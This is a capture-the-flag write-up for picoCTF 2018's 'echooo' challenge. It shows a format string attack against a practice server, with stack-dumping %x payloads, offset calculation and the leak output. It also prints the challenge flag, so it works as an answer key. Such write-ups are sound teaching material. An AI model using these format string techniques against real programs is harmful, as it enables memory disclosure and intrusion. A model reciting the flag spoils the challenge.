# echooo
Binary Exploitation - 300 points

## Challenge 
> This [program](echo) prints any input you give it. Can you leak the flag? 

> Connect with nc 2018shell2.picoctf.com 34802.

> [Source](echo.c).

## Hint
> If only the program used puts...


## Solution

Format string exploit

- https://stackoverflow.com/a/7459758
- http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html

---

Check that the stack is printed properly

	$ nc 2018shell2.picoctf.com 34802
	Time to learn about Format Strings!
	We will evaluate any format string you give us with printf().
	See if you can get the flag!
	
	> %x
	40
	
	> ABCD  %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
	ABCD  00000040 f76e85a0 08048647 f771fa74 00000001 f76f7490 ffb8dcd4 ffb8dbdc 0000048f 08cd8008 44434241 > 8x 00000040 f76e85a0 08048647 f771fa74
	
	> ABCD %11$08x
	ABCD 44434241

So we know that offset `11` points to `buf[64]`.

And to reach `flag[64]`, we need to read past 64 bytes of `buf`.

So start the offset from `11 + 64 / 4` and the offset for flag is at `27`.

	echooo $ python solve.py 
	[+] Opening connection to 2018shell2.picoctf.com on port 34802: Done
	Received: 6f636970
	Progress: pico
	Received: 7b465443
	Progress: picoCTF{
	Received: 6d526f66
	Progress: picoCTF{foRm
	Received: 735f7434
	Progress: picoCTF{foRm4t_s
	Received: 6e695274
	Progress: picoCTF{foRm4t_stRin
	Received: 615f7347
	Progress: picoCTF{foRm4t_stRinGs_a
	Received: 445f6552
	Progress: picoCTF{foRm4t_stRinGs_aRe_D
	Received: 65476e61
	Progress: picoCTF{foRm4t_stRinGs_aRe_DanGe
	Received: 73753072
	Progress: picoCTF{foRm4t_stRinGs_aRe_DanGer0us
	Received: 3866335f
	Progress: picoCTF{foRm4t_stRinGs_aRe_DanGer0us_3f8
	Received: 64656362
	Progress: picoCTF{foRm4t_stRinGs_aRe_DanGer0us_3f8bced
	Received: 000a7d33
	Progress: picoCTF{foRm4t_stRinGs_aRe_DanGer0us_3f8bced3}
	\x00
	[*] Closed connection to 2018shell2.picoctf.com port 34802
	echooo $ 

## Flag

	picoCTF{foRm4t_stRinGs_aRe_DanGer0us_3f8bced3}
